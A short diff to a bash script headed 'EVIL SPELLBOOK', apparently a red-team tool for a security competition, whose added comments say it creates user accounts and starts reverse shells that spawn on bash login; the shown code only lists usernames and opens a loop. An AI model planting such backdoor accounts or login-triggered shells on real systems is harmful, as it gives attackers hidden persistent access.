@@ -1,5 +1,11 @@
 #!/bin/bash
 
+# EVIL SPELLBOOK
+# Author: Caroline Richards
+
+# This script does a few miscellaneous things I wanted to have in place for the competition. 
+# This includes creating users and starting reverse shells that will spawn on bash login. 
+
 usernames=("caroline" "denna" "kvothe" "bast" "auri" "ambrose" "elodin" "fela")
 
 for username in "${usernames[@]}"; do
